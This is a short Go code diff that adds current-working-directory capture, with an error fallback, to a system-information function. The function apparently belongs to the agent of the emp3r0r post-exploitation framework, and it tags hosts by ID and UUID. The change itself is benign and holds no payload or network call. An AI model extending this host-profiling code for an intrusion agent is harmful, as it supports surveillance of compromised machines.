@@ -95,6 +95,11 @@ func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	if err != nil {
 		log.Printf("ProductInfo: %v", err)
 	}
+	info.CWD, err = os.Getwd()
+	if err != nil {
+		log.Printf("Getwd: %v", err)
+		info.CWD = "."
+	}
 
 	RuntimeConfig.AgentTag = util.GetHostID(info.Product, RuntimeConfig.AgentUUID)
 	info.Tag = RuntimeConfig.AgentTag // use hostid
